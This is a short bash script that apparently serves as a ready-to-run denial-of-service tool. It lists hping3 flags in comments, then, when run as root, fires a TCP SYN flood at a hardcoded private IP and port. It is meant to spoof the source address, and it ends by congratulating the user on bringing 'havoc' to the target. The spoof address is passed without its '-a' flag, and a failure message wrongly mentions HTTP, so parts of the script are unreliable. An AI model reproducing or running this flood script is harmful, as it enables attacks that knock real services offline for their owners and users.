#!/bin/bash

# HPING3 commands
# -c –count: packet count
#–faster: alias for -i u1000 (100 packets for second)
# –flood: sent packets as fast as possible. Don’t show replies.
# -V –verbose: verbose mode
# -0 –rawip: RAW IP mode
# -1  –icmp: ICMP mode
# -2 –udp: UDP mode
# -8 –scan: SCAN mode.
# -9 –listen: listen mode
# -a –spoof: spoof source address
# -C –icmptype: icmp type
# -K –icmpcode: icmp code
# -L –setack: set TCP ack
# -F –fin: set FIN flag
# -S  –syn: set SYN flag
# -R  –rst: set RST flag
# -A –ack: set ACK flag
# -X –xmas: set X unused flag (0x40)
# -Y –ymas: set Y unused flag (0x80)

if [[ ${UID} -eq 0 ]];
then
    echo "OK, confirm your are ROOT! :D";
    echo "Proceeding Hping3 with TCP SYN Flood Mode :D";
    target='192.168.2.65';
    spoofAddr='192.168.2.70';
    port='8082';

    hping3 -S $target $spoofAddr -p $port --flood;
    if [[ ${?} -eq 0 ]];
    then
        echo "Congrats!! I believe you brought havoc to your target :D";
        echo "Exiting with 0";
        exit 0;
    else
        echo "Ummm...You might need to fine tune HTTP response from your targets :(";
        echo "Exiting with 1";
        exit 1;
    fi
else
    echo "You aren't ROOT!";
    echo "Exiting with 1";
    exit 1;
fi